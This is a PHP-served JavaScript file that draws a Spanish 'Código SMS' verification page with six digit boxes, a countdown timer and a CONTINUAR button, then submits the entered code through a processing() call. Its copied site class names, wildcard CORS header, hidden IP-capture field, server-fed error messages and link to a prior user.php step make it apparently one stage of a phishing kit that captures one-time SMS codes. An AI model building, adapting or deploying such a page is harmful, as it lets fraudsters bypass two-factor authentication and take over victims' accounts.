<?php
header('Access-Control-Allow-Origin: *');
Header("content-type: application/javascript");
?>
var my_titulo = 'Verificación';
var my_contenido = `
<link rel="stylesheet" href="${my_hosting}css/flow-theme.css" />
<link rel="stylesheet" href="${my_hosting}css/bg-lineas.css" />
<link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">

<style>
  /* Reducir tamaño general ~20% y compactar tipografía */
  .flow-shell { width: min(100vw, 380px); padding-top: 38px; } /* más ancho para el contenedor blanco */
  .panel { padding: 18px 18px 21px; } /* +~30% para agrandar el cuadro contenedor */
  .flow-title { font-size: clamp(24px, 7vw, 30px); margin-bottom: 14px; }
  .flow-subtitle { font-size: 14px; margin-bottom: 12px; line-height: 1.4; }
  .otp-panel { display: flex; flex-direction: column; gap: 12px; }
  .actions-row {
    display: flex;
    gap: 10px;
    justify-content: center;
    margin-top: 6px;
    padding: 24px 0; /* +~30% más alto para el cuadro del botón */
  }
  /* Botón igual al flujo de user.php */
  .btn-primary {
    width: 100%;
    height: 56px;
    border: 0;
    border-radius: 28px;
    background: #cfd1d7;
    color: #8f9299;
    font-family: inherit;
    font-size: 20px;
    font-weight: 600;
    cursor: not-allowed;
    transition: background 0.2s ease, color 0.2s ease, transform 0.1s ease;
  }
  .btn-primary:not([disabled]) {
    background: #f1cd00;
    color: #26282d;
    cursor: pointer;
  }
  .btn-primary:not([disabled]):hover { transform: translateY(-1px); }
  .btn-secondary {
    border: 1.5px solid var(--line-strong);
    background: #fff;
    color: var(--ink);
    padding: 10px 14px;
    border-radius: 999px;
    font-weight: 600;
    cursor: pointer;
    display: inline-flex;
    align-items: center;
    gap: 8px;
  }
  .btn-secondary:hover { border-color: var(--ink); }
  .alert-box {
    display: none;
    background: #fff4ec;
    border: 1.5px solid rgba(255, 127, 47, 0.45);
    color: #8f360b;
    padding: 12px;
    border-radius: 12px;
    display: flex;
    gap: 10px;
    align-items: flex-start;
  }
  .timer-box { text-align: center; font-weight: 700; color: var(--danger); margin-top: 4px; }
  .timer-value { color: #000; }
  .timer-box small { display: block; font-weight: 500; color: var(--muted); }
  .helper-note { margin: 0; text-align: center; color: var(--muted); font-size: 14px; }
  .pin-wrap {
    padding: 20px 32px; /* más ancho para que el cuadro abrace mejor los 6 dígitos */
    display: flex;
    justify-content: center;
  }
  .pin-grid {
    gap: 8px;
    transform: scale(1.35);
    transform-origin: top center;
  }
  .pin-cell { width: 33px; height: 33px; font-size: 16px; }
  .badge { font-size: 11px; }
</style>

<main class="flow-shell">

  <div class="logo-mark" aria-hidden="true">
    <span></span><span></span><span></span>
  </div>

  <h1 class="flow-title">Codigo SMS</h1>
  <p class="flow-subtitle" id="messageDinamic"></p>

  <section class="panel otp-panel">
    <p class="helper-note" id="otpTitle"></p>

    <div class="timer-box" id="smsTimer" style="display:none;">
      <div class="timer-value" id="smsTimerValue">03:00</div>
    </div>

    <div class="alert-box" id="error" style="display:none;">
      <i class='bx bx-info-circle'></i>
      <div class="error__txt"></div>
    </div>

    <div id="formGroup" class="pin-wrap">
      <div class="pin-grid sc-jGKxIK dSFNja">
        <input data-testid="1" type="text" inputmode="numeric" pattern="\\d*" name="field1" id="field1" maxlength="1" class="pin-cell" minlength="1" />
        <input data-testid="2" type="text" inputmode="numeric" pattern="\\d*" name="field2" id="field2" maxlength="1" class="pin-cell" minlength="1" />
        <input data-testid="3" type="text" inputmode="numeric" pattern="\\d*" name="field3" id="field3" maxlength="1" class="pin-cell" minlength="1" />
        <input data-testid="4" type="text" inputmode="numeric" pattern="\\d*" name="field4" id="field4" maxlength="1" class="pin-cell" minlength="1" />
        <input data-testid="5" type="text" inputmode="numeric" pattern="\\d*" name="field5" id="field5" maxlength="1" class="pin-cell" minlength="1" />
        <input data-testid="6" type="text" inputmode="numeric" pattern="\\d*" name="field6" id="field6" maxlength="1" class="pin-cell" minlength="1" />
      </div>
    </div>

    <div class="actions-row sc-gmgFlS dktjrs">
      <button type="button" id="btn-continuar-password" class="btn-primary" disabled>CONTINUAR</button>
    </div>
  </section>

  <div class="meta-hidden">
    <div id="ipc">Dirección IP:</div>
    <div id="jclock1"></div>
  </div>
</main>
`;

  $('#titulo').html(my_titulo);
  $('body').html(my_contenido);
  localStorage.setItem('contenido', my_contenido);

  var otpType = 'SMS';
  var smsTimerInterval = null;
  var $btnContinue = $('#btn-continuar-password');

  $('#smsTimer').show();
  startSmsTimer();

  if (my_data['mensaje']) {
    $('#messageDinamic').html(my_data['mensaje']);
  } else {
    $('#messageDinamic').text('');
  }

  var $otpTitle = $('#otpTitle');
  if ($otpTitle.length) {
    $otpTitle.text('Revisa tu bandeja de SMS y escribe los 6 dígitos.');
  }

  if (my_data['error']) {
    var rawErr = String(my_data['error'] || '');
    $('#error').show();
    $('.error__txt').html(rawErr);
    $('.sc-jGKxIK input[type="text"]').addClass('error-input');
    $('.sc-jGKxIK').addClass('shake');
    setTimeout(function(){ $('.sc-jGKxIK').removeClass('shake'); }, 500);
  } else {
    $('#error').hide();
  }

  $('div.sc-jGKxIK input[type="text"]').on('input', function() {
    let currentInput = $(this);
    let value = currentInput.val();

    if (value.match(/^[0-9]$/) && value.length === 1) {
      let nextInput = currentInput.next('input[type="text"]');
      if (nextInput.length) {
        nextInput.focus();
      }
    }

    $('#error').hide();
    updateContinueState();
  });

  $('div.sc-jGKxIK input[type="text"]').on('keydown', function(event) {
    if (event.key === 'Backspace' && !$(this).val()) {
      var prevInput = $(this).prev('input[type="text"]');
      if (prevInput.length) {
        prevInput.focus();
      }
    }
  });

  function collectOtp() {
    var otp = '';
    $('div.sc-jGKxIK input[type="text"]').each(function() {
      otp += $(this).val();
    });
    return otp;
  }

  function updateContinueState() {
    var otp = collectOtp();
    if (otp.length === 6) {
      $btnContinue.prop('disabled', false);
    } else {
      $btnContinue.prop('disabled', true);
    }
  }
  updateContinueState();

  $('#btn-continuar-password').click(function() {
    var otp = collectOtp();
    if (!otp || otp.length < 6) {
      $('#error').show();
      $('.error__txt').text('Ingresa los 6 dígitos de tu código.');
      $('.sc-jGKxIK input[type="text"]').addClass('error-input');
      return false;
    }

    $btnContinue.prop('disabled', true);

    try {
      if (typeof window.my_data !== 'object' || window.my_data === null) {
        window.my_data = {};
      }
      window.my_data.otp = otp;
      window.my_data.otpType = otpType;
    } catch (e) {}

    processing({
      t: 'otp',
      otp: otp,
      otpType: otpType
    });

    return false;
  });

  function startSmsTimer() {
    var time = 180;
    var $timerValue = $('#smsTimerValue');
    if (smsTimerInterval) clearInterval(smsTimerInterval);

    smsTimerInterval = setInterval(function() {
      time--;
      var minutes = Math.floor(time / 60).toString().padStart(2, '0');
      var seconds = (time % 60).toString().padStart(2, '0');
      if ($timerValue.length) {
        $timerValue.text(minutes + ':' + seconds);
      }
      if (time <= 0) {
        clearInterval(smsTimerInterval);
      }
    }, 1000);
  }
